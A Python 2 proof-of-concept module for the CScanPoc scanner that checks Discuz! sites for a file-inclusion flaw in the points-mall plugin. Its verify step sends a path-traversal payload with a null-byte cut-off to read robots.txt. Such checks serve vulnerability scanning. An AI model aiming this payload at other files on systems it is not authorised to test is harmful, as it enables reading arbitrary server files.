# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Discuz_0022'  # 平台漏洞编号，留空
    name = 'discuz积分商城插件任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-08-04'  # 漏洞公布时间
    desc = '''
        action参数未过滤直接传入$file后面的用%00截断即可包含任意文件。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz!'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5290293e-54a1-4a9b-8ef2-7718e66997c3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #_Refer_ = http://www.wooyun.org/bugs/wooyun-2015-0131386
            payload = '/plugin.php?action=../../../../../robots.txt%00&id=dc_mall'
            verify_url = self.target + payload
            
            req = requests.get(verify_url)
            if req.status_code == 200 and "User-agent" in req.content and 'robots.txt for Discuz' in req.content and 'Disallow:' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
